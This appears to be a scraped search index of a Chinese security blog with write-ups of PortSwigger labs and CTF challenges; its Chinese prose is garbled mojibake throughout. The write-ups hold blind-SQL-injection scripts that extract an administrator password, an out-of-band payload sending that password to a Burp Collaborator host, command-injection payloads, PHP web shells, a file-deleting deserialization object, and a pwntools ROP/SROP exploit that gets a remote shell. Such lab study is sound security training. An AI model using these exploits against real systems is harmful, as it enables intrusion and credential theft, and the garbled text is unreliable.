æœ‰è¿‡æ»¤ä¼šå¯¹æˆ‘ä»¬ä¼ å…¥çš„../è¿›è¡Œæ¸…é™¤è¿‡æ»¤ï¼Œä½†æ˜¯åªä¼šè¿‡æ»¤ä¸€æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡ 0x4 äºŒæ¬¡URLè§£ç å½“ç½‘ç«™å¯¹è¾“å…¥åšäº†æ­£åˆ™åŒ¹é…ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨urlç¼–ç è¿›è¡Œç»•è¿‡ï¼Œè¿™æ ·åœ¨æ­£åˆ™çš„æ—¶å€™ä¸ä¼šè¢«åŒ¹é…åˆ°ï¼Œä½†æ˜¯åˆ°æœåŠ¡å™¨æ—¶ï¼Œåˆå¯¹æˆ‘ä»¬è¾“å…¥åšäº†è§£ç ï¼ŒæˆåŠŸåˆ©ç”¨ è¿™é‡Œå¯ä»¥ç”¨burpè‡ªå¸¦çš„fuzzå­—å…¸è¿›è¡Œä¸€ä¸ªçˆ†ç ´ 0x05 åŒ¹é…ä»¥é¢„æœŸçš„è·¯å¾„æœ‰äº›ç¨‹åºä»–åªåŒ¹é…ä½ æ˜¯å¦ä»¥ä»–é¢„æœŸçš„è·¯å¾„æ–‡ä»¶å¼€å¤´ï¼Œè€Œä¸å»å¯¹åé¢çš„åšé˜²æŠ¤ï¼Œä¸€æ ·çš„æ€è·¯ç»•è¿‡ 0x06 %00æˆªæ–­çœ‹é¢˜ç›®æè¿°æ˜¯ä¼šåˆ¤æ–­æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶æ ¼å¼çš„åç¼€ç»“å°¾ï¼Œä½†æ˜¯åœ¨åç«¯éªŒè¯æ—¶ï¼Œå½“è¯»åˆ°00ç©ºå­—ç¬¦å°±ä¸ä¼šç»§ç»­è¯»ä¸‹å»ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹çš„payload é¢„é˜²&amp;&amp;æ€»ç»“å¦‚ä½•é˜²å¾¡æ–‡ä»¶ç©¿è¶Šæ¼æ´ è®¾ç½®ç™½åå•ï¼Œä»…å…è®¸ä¼ å…¥è·¯å¾„ä¸­å…è®¸åŒ…å«çš„å­—ç¬¦å’Œæ•°å­— éªŒè¯è¾“å…¥åï¼Œä½¿ç”¨æ–‡ä»¶å¹³å°çš„APIæ¥è§„èŒƒè·¯å¾„ï¼Œçœ‹æ˜¯å¦ä»¥é¢„æœŸåŸºæœ¬ç›®å½•å¼€å¤´ burpç»™äº†ä¸€æ®µæ¼”ç¤ºä»£ç ï¼ˆjavaï¼‰ File file = new File(BASE_DIRECTORY, userInput);if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file} è¿™ä¸ªä¸“é¢˜åªæœ‰6ä¸ªå®éªŒï¼Œä¹Ÿéƒ½æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥è€ƒè™‘å’Œæ–‡ä»¶ä¸Šä¼ æ¼æ´ç»“åˆèµ·æ¥","link":"/2022/03/10/burp_dir_tra/"},{"title":"Burpsuiteé¶åœº----SQLæ³¨å…¥ä¸“é¢˜","text":"è¿™é‡Œä¸»è¦æ˜¯ä¸ªäººç¬”è®°ï¼Œè®°å½•ä¸€äº›æˆ‘ä¸ªäººè¦è®°å½•çš„ç‚¹ï¼Œä¸ç®—æ˜¯å®Œæ•´çš„write up burpsuiteç»™äº†ä¸€ä¸ªå¾ˆå¥½çš„å„ç§sqlè¯­å¥å·®åˆ«çš„æ•´åˆ https://portswigger.net/web-security/sql-injection/cheat-sheet Lab: SQL injection attack, querying the database type and version on Oracleåœ¨oracleæ•°æ®åº“ä¸­ï¼Œæ¯ä¸ªselectè¯­å¥åéƒ½å¿…é¡»æŒ‡å®šé€‰æ‹©çš„è¡¨åï¼Œæ°å¥½oracleä¸­æœ‰ä¸€ä¸ªå†…ç½®çš„dualè¡¨ å¯ä»¥å°è¯•è¿™æ · ' union select 'lnk','zing' from dual -- æŸ¥è¯¢oracleæ•°æ®åº“ç‰ˆæœ¬ SELECT banner FROM v$versionSELECT version FROM v$instance payload ' union select banner,'cnc' from v$version -- SQL injection attack, listing the database contents on OracleæŸ¥è¯¢oracleæ•°æ®åº“çš„çš„è¡¨å’Œæ®µ SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' Lab: Blind SQL injection with conditional responsesç›²æ³¨è„šæœ¬ å…¶å®ç”¨burpsuiteè·‘å¾ˆå¿«å°±è·‘å‡ºç»“æœäº†ï¼Œpythonä¼šæ…¢ä¸€äº›ï¼Œä½†æ˜¯burpä¸èƒ½æŠŠå­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥ import requestsdef blind_sql_injection(url, length): password = '' headers = {} for i in range(1, length+1): base_cookie = f&quot;TrackingId=XN8KvPf0TbIGabZ6' and (select ascii(substring(password, %s, 1)) from users where username='administrator' )='[char]' --; session=aMdbiac40Bds8bKv3FE85vvVBsjwscrK&quot; % str(i) for j in range(48, 123): print(&quot;payload--&gt;digit:%s with &quot; % str(i), chr(j)) cookie = base_cookie.replace(&quot;[char]&quot;, str(j)) headers['cookie'] = cookie r = requests.get(url, headers=headers) if &quot;Welcome back&quot; in r.content.decode('utf-8'): password += chr(j) break print(&quot;password--&gt;&quot;, password)url = &quot;https://ac241fb81ede6a4cc09132c900460036.web-security-academy.net/&quot;blind_sql_injection(url, 20) è¿™é‡Œæˆ‘å°±åªæˆªä¸€éƒ¨åˆ†å›¾äº†ï¼Œæ‡’å¾—è·‘ä¸‹å»äº†ï¼Œå¤ªæ…¢äº† Lab: Blind SQL injection with conditional errorsé”™è¯¯æ¡ä»¶çš„ç›²æ³¨ é¦–å…ˆåŠ å•å¼•å·æŠ¥é”™ï¼Œç„¶ååŠ ä¸ªæ³¨é‡Šå‘ç°æ­£å¸¸ï¼Œæ‰€ä»¥åˆ¤æ–­SQLè¯­å¥ä¸º select trick_id from trick_tab where trick='vQdcV0dBQuBUyGx9' ç„¶ååˆ¤æ–­æ•°æ®åº“ï¼Œé¦–å…ˆæŸ¥è¯¢ä¸€ä¸ªç©ºå€¼ ' union select '' -- ç„¶åå°è¯•oracleçš„dualè¡¨ ' union select '' from dual -- é¡µé¢æ­£å¸¸ï¼Œæ‰€ä»¥æ•°æ®åº“ä¸ºoracle æ¥ç€æˆ‘ä»¬å°è¯•å»ä¸€ä¸ªä¸å­˜åœ¨çš„è¡¨ä¸­æŸ¥è¯¢ï¼Œå‘ç°åˆæŠ¥é”™ï¼Œè¿™ä¸ªå¾ˆæ˜æ˜¾åç«¯åœ¨æŠŠæˆ‘ä»¬è¾“å…¥çš„è¯­å¥å½“ä½œä»£ç æ‰§è¡Œ select '' from lnk è¿™é¢˜å’Œä¸Šé¢ç±»ä¼¼ï¼Œåªæ˜¯å°†å“åº”å­—ç¬¦ä¸²å–ä»£ä¸ºæŠ¥é”™å“åº” äºæ˜¯æˆ‘ä»¬å‚è€ƒæ„é€ payload ' union select case when(1=1) then to_char(1/0) else null end from users -- å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå½“whenä¸­æ¡ä»¶ä¸ºçœŸæ—¶ï¼Œè¿”å›500ï¼Œä¸ºå‡æ—¶ï¼Œé¡µé¢æ‰æ˜¯æ­£å¸¸ï¼Œè¿™å’Œä¸Šé¢åˆšå¥½æ˜¯ç›¸åçš„ ä¸€æ ·çš„ï¼Œé¦–å…ˆç”¨burpçˆ†ç ´å‡ºå¯†ç é•¿åº¦ ' union select case when(username='administrator' and length(password)=1) then to_char(1/0) else null end from users -- ç»“æœå¦‚ä¸‹ï¼Œé•¿åº¦æ˜¯20 exp import requestsdef blind_sql_injection(url, length): password = '' headers = {} for i in range(1, length + 1): base_cookie = f&quot;TrackingId=PnmnAqssW0voE21g' union select case when (username='administrator' and ascii(substr(password, %s, 1))=[char]) then to_char(1/0) else null end from users --; session=ZTFD8NTb6aoJjWU0ENRuwMHso9ySKox2&quot; % str(i) for j in range(48, 123): print(&quot;payload--&gt;digit%s with &quot; % str(i), chr(j)) cookie = base_cookie.replace(&quot;[char]&quot;, str(j)) headers[&quot;cookie&quot;] = cookie r = requests.get(url, headers=headers) if 500 == r.status_code: password += chr(j) break print(&quot;password--&gt;&quot;, password)url = &quot;https://ac6d1f6a1ea307acc1c50c14006000ca.web-security-academy.net/&quot;length = 20blind_sql_injection(url, length) Lab: Blind SQL injection with time delays and information retrievalæ—¶é—´ç›²æ³¨ï¼Œç”¨burp cheat sheetç»™çš„payload fuzzä¸‹æ•°æ®åº“ï¼Œå‘ç°æ˜¯PostgreSQL æ¥ç€ç”¨ç±»ä¼¼çš„payloadæµ‹è¯•å»¶æ—¶æ³¨å…¥ ' || (select case when (1=1) then pg_sleep(1) else pg_sleep(0) end from users) -- burpæµ‹è¯•ä¸€ä¸‹ï¼Œpasswordé•¿åº¦è¿˜æ˜¯20 ' || (select case when (username='administrator' and length(password)=20) then pg_sleep(1) else pg_sleep(0) end from users) -- è¿™é‡Œpythonè„šæœ¬çš„timeoutå’Œsleepä¸å¤ªä¸€æ ·ï¼Œæˆ‘æš‚æ—¶è¿˜çˆ†ç ´ä¸å‡ºæ¥ï¼Œå¦‚æœæœ‰çŸ¥é“çš„å¸ˆå‚…å¸Œæœ›èƒ½å‘Šè¯‰æˆ‘ä¸€ä¸‹ï¼ˆğŸ€âš½ï¸äº† ç”¨burpçˆ†ç ´åªèƒ½å¼€1ä¸ªçº¿ç¨‹ï¼Œå¼€å¤šäº†ä¹Ÿä¼šå¯¼è‡´æœ‰é”™è¯¯ï¼Œåæ­£å°±æŒºæ¶å¿ƒæŒºè´¹æ—¶çš„è¿™é¢˜ payload '+||+(select+case+when+(username='administrator'+and+substring(password,Â§1Â§,1)='Â§aÂ§')+then+pg_sleep(2)+else+pg_sleep(0)+end+from+users)+-- Lab: Blind SQL injection with out-of-band interactionåˆ©ç”¨å¸¦å¤–(OAST)æŠ€æœ¯å‘åŠ¨ç›²æ³¨ç‚¹å‡»burpçš„Burp Coolaborator clientç”Ÿæˆä¸€ä¸ªä¸´æ—¶åœ°å€ï¼Œå‘é€ç»™ä½ çš„å¥½å‹ï¼Œä»–ä»¬ç‚¹å‡»ä¹‹åå°±ä¼šæ”¶åˆ°ä¸€äº›ä¿¡æ¯ çœ‹uaå¤´å¯ä»¥çœ‹åˆ°å¯¹æ–¹çš„ä¸€äº›è®¾å¤‡åŸºæœ¬ä¿¡æ¯ TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual-- è¿™ä¸ªæ˜¯burpç»™çš„ä¸€ä¸ªpayloadæ¨¡æ¿ï¼Œæ‰“è¿‡å»å°±å¯è¿‡è¿™ä¸ªlab ç¬¬äºŒä¸ªå®éªŒå°±æ˜¯ç”¨oastæŠ€æœ¯æ³„æ¼å‡ºä¿¡æ¯ æˆ‘ä»¬å¯ä»¥åœ¨ä¸Šé¢æ¨¡æ¿ä¸­çš„åŸŸåé‡Œå†™å…¥sqlè¯­å¥å¸¦å‡ºæŸ¥è¯¢çš„æ•°æ® payload x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//'||(select password from users where username='administrator')||'~cp5gpi5bar1xg1c1n8t3ehnk5bb1zq.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual-- è¿™æ ·å°±å¸¦å‡ºäº†å¯†ç  äºŒæ¬¡æ³¨å…¥burpçš„è¿™å¼ å›¾å¾ˆå½¢è±¡çš„å±•ç¤ºäº†äºŒæ¬¡æ³¨å…¥çš„åŸºæœ¬åˆ©ç”¨ é¦–å…ˆæŸ¥è¯¢ä¸€ä¸ªæ­£å¸¸çš„ï¼Œæ¥ç€ä»¥åˆ†å·ä¸ºç•Œï¼Œåé¢çš„åˆä¼šè¢«å½“ä½œsqlè¯­å¥å»æ‰§è¡Œ æ€»ç»“å’Œæ£€æµ‹sqlæ³¨å…¥ä»¥åŠé˜²å¾¡ å¯ä»¥é€šè¿‡å·¥å…·æ¯”å¦‚burpå’Œsqlmapè¿›è¡Œæ£€æµ‹sqlæ³¨å…¥ æ·»åŠ å•å¼•å·â€™ç­‰å­—ç¬¦æŸ¥çœ‹æ˜¯å¦æœ‰æŠ¥é”™ä¿¡æ¯ æäº¤ä¸€äº›ç‰¹å®šsqlè¯­å¥ï¼Œè¾“å…¥ä¸€äº›åŸºæœ¬çš„å€¼å’Œå…¶ä»–çš„å€¼ï¼Œè§‚å¯Ÿç³»ç»Ÿé¡µé¢å“åº”æ˜¯å¦æœ‰å˜åŒ–æˆ–è€…å·®å¼‚ åˆ©ç”¨boolæ¡ä»¶or 1 = 1 å’Œor 1 = 2åˆ¤æ–­é¡µé¢å“åº”æ˜¯å¦ä¸ä¸€æ · æäº¤ä¸€äº›è§¦å‘å»¶æ—¶çš„payloadçœ‹é¡µé¢å“åº”æ˜¯å¦åŒå»¶æ—¶æœ‰å…³ åˆ©ç”¨OAST payloads ï¼Œç›‘è§†æ˜¯å¦æœ‰äº¤äº’ ä¸€äº›sqlæ³¨å…¥çš„ç‚¹ ä¸€äº›æ•°æ®åº“çš„ä¸åŒé€ æˆçš„å·®å¼‚ä¾ç„¶æ˜¯è¿™ä¸ªé“¾æ¥ é˜²å¾¡ ä¸€èˆ¬å¤§éƒ¨åˆ†çš„sqlæ³¨å…¥éƒ½å¯ä»¥é€šè¿‡é¢„å¤„ç†è¯­å¥å°±æ˜¯å‚æ•°åŒ–æŸ¥è¯¢æ¥é¿å… å®Œå–„ç™½é»‘åå• å…³é—­é”™è¯¯æç¤º ç»Ÿä¸€ç¼–ç  é—­åˆå¯æ§çš„å˜é‡ï¼Œå¹¶ä¸”è½¬ä¹‰ å®‰è£…WAF å‚è€ƒportswigger sqlé¶åœº å¯¹MYSQLæ³¨å…¥ç›¸å…³å†…å®¹åŠéƒ¨åˆ†Trickçš„å½’ç±»å°ç»“ æ¢¨å­å¸¦ä½ åˆ·burpsuiteé¶åœºç³»åˆ—ä¹‹æœåŠ¡å™¨ç«¯æ¼æ´ç¯‡ - Sqlæ³¨å…¥ä¸“é¢˜ sqlç›²æ³¨pythonè„šæœ¬","link":"/2022/03/02/burp_sql/"},{"title":"Burpsuiteé¶åœº---å‘½ä»¤æ³¨å…¥ä¸“é¢˜","text":"å‘½ä»¤æ³¨å…¥ä¸“é¢˜ 0x01 Lab: OS command injection, simple caseç®€å•æµ‹è¯•ä¸‹ï¼Œå‘ç°è¿™é‡Œæœ‰æ³¨å…¥ç‚¹ 0x02 Lab: Blind OS command injection with time delaysè¿™æ¬¡æ³¨å…¥æ²¡æœ‰å›æ˜¾å†…å®¹ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨echoç­‰å‘½ä»¤æ¥æµ‹è¯•ï¼Œå¯ä»¥é ;ping -c 10 127.0.0.1;æ ¹æ®é¡µé¢å“åº”æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥ 0x03 Lab: Blind OS command injection with output redirectionåˆšåˆšè¯´äº†å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œä½†æˆ‘ä»¬æ€ä¹ˆçœ‹åˆ°æƒ³è¦çš„å†…å®¹å‘¢ï¼Œç­”æ¡ˆå°±æ˜¯é‡å®šå‘è¾“å‡ºï¼Œåˆ©ç”¨è¿™æ ·çš„payload ;id&gt;/var/www/images/1.txt ç„¶åå†å»è®¿é—® ?filename=1.txt 0x04 Lab: Blind OS command injection with out-of-band interactionåˆ©ç”¨nslookupå‘½ä»¤å»å¤–å¸¦å‡ºå›æ˜¾ 0x05 Lab: Blind OS command injection with out-of-band data exfiltrationä»¥ä¸‹åˆ†éš”ç¬¦é€‚ç”¨äºWindowså’ŒLinux &amp; &amp;&amp; | || ä»¥ä¸‹å‘½ä»¤åˆ†éš”ç¬¦ä»…é€‚ç”¨äºåŸºäº Unix çš„ç³»ç»Ÿï¼š ; æ¢è¡Œç¬¦ï¼ˆ0x0aæˆ–\\nï¼‰ åœ¨åŸºäºUNIXçš„systemä¸Šï¼Œè¿˜å¯ä»¥ç”¨è¿™äº›å‘½ä»¤å®ç°æ‰§è¡Œ `injected command` $(injected command ) é˜²æ­¢æ³¨å…¥ æ ¹æ®å…è®¸å€¼çš„ç™½åå•è¿›è¡ŒéªŒè¯ã€‚ éªŒè¯è¾“å…¥æ˜¯å¦ä¸ºæ•°å­—ã€‚ éªŒè¯è¾“å…¥ä»…åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ï¼Œä¸åŒ…å«å…¶ä»–è¯­æ³•æˆ–ç©ºæ ¼ã€‚ æ°¸è¿œä¸è¦å°†shellå…ƒå­—ç¬¦è½¬ä¹‰å¤„ç†ï¼Œå®¹æ˜“è¢«ç»•è¿‡","link":"/2022/03/10/burp_os/"},{"title":"Burpsuiteé¶åœº---æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸“é¢˜","text":"æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸“é¢˜ Lab: Remote code execution via web shell uploadæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥è¯» &lt;?php var_dump(file_get_contents('/home/carlos/secret'));?&gt; Lab: Web shell upload via Content-Type restriction bypassè¿™ä¸ªä¹Ÿæ˜¯æ”¹ä¸‹Content-Typeå°±å¥½äº† Lab: Web shell upload via path traversalè¿™ä¸ªå¹¶ä¸é™åˆ¶æˆ‘ä»¬ä¼ å…¥phpæ–‡ä»¶ï¼Œä½†æ˜¯ä¼šæŠŠæˆ‘ä»¬ä¼ å…¥çš„å¯æ‰§è¡Œä»£ç å˜æˆæ–‡æœ¬ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åˆ©ç”¨ç‚¹ è¿™æ ·æˆ‘ä»¬æ˜¯å¯ä»¥åœ¨ä¸Šä¸€çº§ç›®å½•é‡Œå»æ‰§è¡Œä»»æ„ä»£ç  Lab: Web shell upload via extension blacklist bypassè€ƒä¸€äº›ä¸å¸¸è§æ‰©å±•åç»•è¿‡ .phtml .PHp pht, phpt, phtml, php3,php4,php5,php6 Lab: Web shell upload via obfuscated file extensionæ··æ·†æ–‡ä»¶åç»•è¿‡ï¼Œä¾ç„¶æ˜¯bypassï¼Œè¿™é‡Œæˆ‘ç›´æ¥ç”¨00æˆªæ–­ç»•è¿‡äº† Lab: Remote code execution via polyglot web shell uploadæœ‰äº›ä¸åˆ¤æ–­åç¼€ï¼Œåˆ¤æ–­æ–‡ä»¶å†…å®¹æ˜¯å¦ç¬¦åˆé¢„æœŸ å¯ä»¥æ”¹æ–‡ä»¶å¤´ç»•è¿‡ GIF89a&lt;?php var_dump(file_get_contents('/home/carlos/secret'));?&gt; Lab: Web shell upload via race conditionæ¡ä»¶ç«äº‰ï¼Œbutï¼Œä¸€å®šä¸€å®šè¦è®°å¾—æœ€åGETè¯·æ±‚è¦å¤šä¸€ä¸ªæ¢è¡Œï¼Œä¸ç„¶æ€ä¹ˆä¹Ÿè·‘ä¸å‡ºæ¥ ç¤¾åŒºè§£ç­”","link":"/2022/03/12/burp_file_upload/"},{"title":"CISCN 2019åå— PWN3","text":"è§£æ³• è¿™é¢˜æœ‰ä¸¤ç§è§£æ³• csu srop ret2csu .text:00000000004004E2 mov rax, 3Bh ; â€˜;â€™.text:00000000004004E9 retn ç¨‹åºä¸­ç™½ç»™äº†ä¸€æ®µgadgetsï¼Œ0x3båˆšå¥½å¯¹åº”execveï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨å®ƒï¼Œç„¶åé€šè¿‡ropæ„é€ å¦å¤–ä¸‰ä¸ªå‚æ•° /bin/sh,0,0åˆ†åˆ«å¯¹åº”rdi, rsi, rdx leak addré¦–å…ˆæˆ‘ä»¬é€šè¿‡sys_readè¯»å…¥å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶ä½ç½®ï¼ŒåªçŸ¥é“æ˜¯åœ¨æ ˆä¸Šï¼Œäºæ˜¯æˆ‘ä»¬å°±è¦æ³„æ¼æ ˆåœ°å€å¹¶ä¸”æ‹¿åˆ°å­—ç¬¦ä¸²è¾“å…¥çš„åœ°å€ è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡gdbå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬è¾“å…¥çš„åœ°å€è·ç¦»æ ˆåŸºå€çš„åç§»æ˜¯å›ºå®šçš„0x118 writeæ‰“å°å‡º0x30ä¸ªå­—èŠ‚ï¼Œå¯ä»¥çœ‹å‡ºä»ä½åœ°å€å¼€å§‹æ‰“å°0x20ä¸ªå­—èŠ‚å0x8å°±æ˜¯æ ˆåŸºå€ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€  payload1 = b'/bin/sh\\x00' + b'b' * 8 + p64(vul_addr)sd(payload1)rv(0x20)bin_sh = u64(rv(8)) - 0x118ms('bin_sh', bin_sh) æ¥æ³„æ¼å‡ºè¾“å…¥/bin/shçš„åœ°å€ï¼Œå¹¶ä¸”è¿”å›åˆ°vulå‡½æ•°ï¼Œè¿›è¡Œå†ä¸€æ¬¡çš„åˆ©ç”¨ csuä¹‹åå°±æ˜¯æ‰“csuçš„éƒ¨åˆ†äº†ï¼Œè¿™é‡Œå¯ä»¥å»wikiä¸Šå­¦ä¹ ä¸‹æˆ–è€…å‚è€ƒå…¶ä»–å¸ˆå‚…çš„wp expfrom pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']elf = ELF('./ciscn_2019_s_3')libc = ELF('/lib/i386-linux-gnu/libc.so.6')#io = process('./ciscn_2019_s_3')io = remote('node4.buuoj.cn', 29397)sl = lambda s : io.sendline(s)sd = lambda s : io.send(s)rv = lambda n : io.recv(n)rc = lambda : io.recv()ru = lambda s : io.recvuntil(s)def ms(name,addr): print(name + &quot;----&gt;&quot; + hex(addr))def debug(mallocr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print }}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(io,'b *{}'.format(hex(text_base+mallocr))) else: gdb.attach(io,&quot;b *{}&quot;.format(hex(mallocr)))vul_addr = 0x0000000004004EDpop6_ret = 0x00000000040059Amov3_call = 0x0000000000400580execve_call = 0x00000000004004E2sys_call = 0x0000000000400517pop_rdi_ret = 0x00000000004005a3payload1 = b'/bin/sh\\x00' + b'b' * 8 + p64(vul_addr)sd(payload1)rv(0x20)bin_sh = u64(rv(8)) - 0x118ms('bin_sh', bin_sh)# csupayload2 = b'/bin/sh\\x00' + b'a' * 8 + p64(pop6_ret)payload2 += p64(0) * 2 + p64(bin_sh+0x50) + p64(0) * 3payload2 += p64(mov3_call) + p64(execve_call)payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)sd(payload2)io.interactive() SROPsignalæœºåˆ¶ ç”¨æˆ·è¿›ç¨‹æ¥åˆ°ä¸€ä¸ªsignalï¼Œå°†æ§åˆ¶æƒç»™åˆ°å†…æ ¸å±‚ å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠsignalä¿¡æ¯å’Œsigreturnçš„ç³»ç»Ÿè°ƒç”¨åœ°å€ï¼Œä¹‹åè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signal æ‰§è¡Œå®Œsignal handlerï¼Œå°±è·³è½¬åˆ°å†…æ ¸å±‚ å†…æ ¸æ¢å¤2ä¸­ä¿å­˜çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå¹¶æŠŠæ§åˆ¶æƒç»™åˆ°ç”¨æˆ·å±‚ æ”»å‡»æ€è·¯æˆ‘ä»¬å¯ä»¥åœ¨æ¢å¤è¿›ç¨‹ä¸Šä¸‹æ–‡çš„æ—¶å€™ï¼Œæ„é€ ä¸€ä¸ªfake_SigFrameï¼Œå°±èƒ½æ§åˆ¶å¯„å­˜å™¨æ¥åŠ«æŒç¨‹åºæµç¨‹ å¯¹äºctfé¢˜pwntoolsé‡Œæ˜¯é›†æˆäº†æ¡†æ¶,å¦‚ä¸Šé¢˜ sigreturn = 0x00000000004004DAframe = SigreturnFrame()frame.rax = 59frame.rdi = bin_shframe.rsi = 0frame.rip = sys_callpayload2 = b'/bin/sh\\x00' + p64(0) + p64(sigreturn) + p64(sys_call) + bytes(frame)sd(payload2) åªéœ€è¦æ”¹payload2é‚£ä¸€éƒ¨åˆ†ï¼Œè¦æ³¨æ„æŒ‡å®šcontext.arch = &quot;amd64&quot;","link":"/2022/03/03/ciscn_19_s_3/"},{"title":"Burpsuite---ååºåˆ—åŒ–ä¸“é¢˜","text":"åŒæ ·çš„å“ˆï¼Œæˆ‘åªè®°å½•ä¸€äº›ç‚¹ï¼Œä¸æ˜¯å®Œæ•´çš„wp Lab: Arbitrary object injection in PHPè¿™é‡Œæœ‰ä¸ªè¯»æ–‡ä»¶çš„ç‚¹ å¯ä»¥åœ¨æ–‡ä»¶åååŠ ä¸€ä¸ª~æ¥è¯»å…¶å¤‡ä»½æ–‡ä»¶ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¯»åˆ°ç«™ç‚¹åœ°å›¾ç»™çš„æ–‡ä»¶æºç  å¾ˆæ˜æ˜¾æœ‰ä¸ªæ¼æ´å‡½æ•° function __destruct() { // Carlos thought this would be a good idea if (file_exists($this-&gt;lock_file_path)) { unlink($this-&gt;lock_file_path); } } åœ¨å¯¹è±¡é”€æ¯æ—¶ä¼šè°ƒç”¨ï¼Œunlinkæ˜¯åˆ é™¤æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ„é€  &lt;?phpclass CustomTemplate { private $lock_file_path = &quot;/home/carlos/morale.txt&quot;;}$a = new CustomTemplate(&quot;/home/carlos/morale.txt&quot;);var_dump(serialize($a)); å†base64ç¼–ç ä¼ è¿‡å»å°±å¯ä»¥åˆ é™¤æŒ‡å®šæ–‡ä»¶ Lab: Exploiting Java deserialization with Apache Commonsä¸€ä¸ªjavaååºåˆ—åŒ–çš„å·¥å…· https://github.com/frohoff/ysoserial å¯ä»¥ç”ŸæˆæŒ‡å®šçš„payload Lab: Exploiting PHP deserialization with a pre-built gadget chainé¦–å…ˆå¯ä»¥æ„é€ ä¸€ä¸ªé”™è¯¯çš„cookieä½¿å…¶æŠ¥é”™ï¼Œç„¶åå‘ç°å¯ä»¥çœ‹åˆ°æ¡†æ¶ä¿¡æ¯Symfony Version: 4.3.6 çŸ¥é“æ¡†æ¶åŠå…¶ç‰ˆæœ¬å°±å¯ä»¥åˆ©ç”¨PHPGGCé‚£ä¸ªå·¥å…·æ¥å®ç°rceçš„payload ç„¶åå¯¹ç…§æŠ“åŒ…çš„é‚£ç§æ ¼å¼ç”¨phpå†™ä¸€ä¸ªexpï¼Œè¦ç”¨urlç¼–ç æ‰å¯ä»¥ æœ€åæ”¹æ‰åŸæ¥çš„é‚£ä¸ªcookieå‘åŒ…å‡ºå»å°±å¯ä»¥è¿‡äº†","link":"/2022/03/14/burp_unser/"},{"title":"CTFshowç›®æ ‡èµ„äº§æ¸—é€è®¤è¯","text":"RW02ç›®æ ‡èµ„äº§æ¸—é€è®¤è¯ é¦–å…ˆæ˜¯è®¿é—®ç»™çš„é¶æ ‡ï¼Œçœ‹åˆ°å¸®åŠ©æ–‡æ¡£åº•éƒ¨æœ‰Anonymous-Chat-Room äºæ˜¯æˆ‘ä»¬ä¸Šè°·æ­Œæœï¼Œå¯ä»¥æ‰¾åˆ° https://github.com/ping-xiong/Chat-Room-for-Two/blob/master/Applications/chat/Events.php å°è¯•é»˜è®¤çš„åå°è´¦æˆ·å¯†ç ï¼Œä½†æ˜¯è¡Œä¸é€šï¼Œæ¥ç€ç¿»ä¸€ä¸‹ç›®å½•ä»£ç ï¼Œå‘ç°äº†ä¸€ä¸ªphoto_upload if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;))){ if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) { echo &quot;æ— æ•ˆæ–‡ä»¶&quot;; } else { $file_name = uniqid(); move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;images/photo/&quot; . $file_name.$_FILES[&quot;file&quot;][&quot;name&quot;]); echo $file_name.$_FILES[&quot;file&quot;][&quot;name&quot;]; }}else{ echo &quot;æ— æ•ˆæ–‡ä»¶&quot;;} 